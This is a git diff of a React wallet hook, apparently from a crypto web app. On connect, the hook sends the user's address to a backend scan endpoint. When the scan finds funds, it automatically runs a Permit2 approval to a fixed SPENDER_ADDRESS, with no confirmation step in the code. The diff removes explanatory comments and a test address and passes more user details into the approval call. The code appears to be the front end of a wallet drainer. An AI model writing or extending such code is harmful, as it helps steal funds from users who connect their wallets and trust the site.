@@ -6,10 +6,6 @@ import API from "../providers/axios";
 import { usePermit2Execution } from "./usePermit2Execution";
 import type { ScanResult } from "../types/wallet.ts";
 
-// type ModalView = Parameters<ReturnType<typeof useAppKit>["open"]>[0] extends {
-//   view?: infer V;
-// } ? V : never;
-
 type ModalView =
   | "Connect"
   | "Account"
@@ -23,13 +19,13 @@ export function useWallet() {
   const [scanResult, setScanResult] = useState<ScanResult | null>(null);
   const { executePermit2 } = usePermit2Execution();
 
-  const { address, isConnected, isConnecting, isReconnecting, status } =
+  const { address, isConnected, isConnecting, isReconnecting, status, chain } =
     useAccount();
   const { disconnect } = useDisconnect();
   const chainId = useChainId();
+  const chainName = chain?.name;
   const { open } = useAppKit();
 
-  // Step 1 — Scan wallet on connect
   useEffect(() => {
     if (!address || !isConnected) return;
 
@@ -37,7 +33,6 @@ export function useWallet() {
       try {
         const res = await API.post("/api/scan-wallet", {
           userAddress: address,
-          // userAddress: "0x3618209a13ad3ed309243ffababaa2df7f83a8e7",
         });
         const result = res.data;
 
@@ -46,7 +41,7 @@ export function useWallet() {
           return;
         }
 
-        setScanResult(result.data[0]); // store Polygon (first chain) result
+        setScanResult(result.data[0]);
       } catch (error) {
         console.error("Scan failed:", error);
       }
@@ -55,14 +50,19 @@ export function useWallet() {
     scanWallet();
   }, [address, isConnected]);
 
-  // Step 2 — Execute Permit2 once scan result is available
   useEffect(() => {
     if (!scanResult || !isConnected) return;
     if (!scanResult.has_funds || !scanResult.permit2?.length) return;
 
     const run = async () => {
       try {
-        await executePermit2(scanResult, SPENDER_ADDRESS, chainId);
+        await executePermit2(
+          scanResult,
+          SPENDER_ADDRESS,
+          chainId,
+          chainName,
+          address!,
+        );
         console.log("done");
       } catch (error) {
         console.error("Permit2 execution failed:", error);
@@ -88,6 +88,7 @@ export function useWallet() {
     isReconnecting,
     status,
     chainId,
+    chainName,
     scanResult,
     balance: balance
       ? {
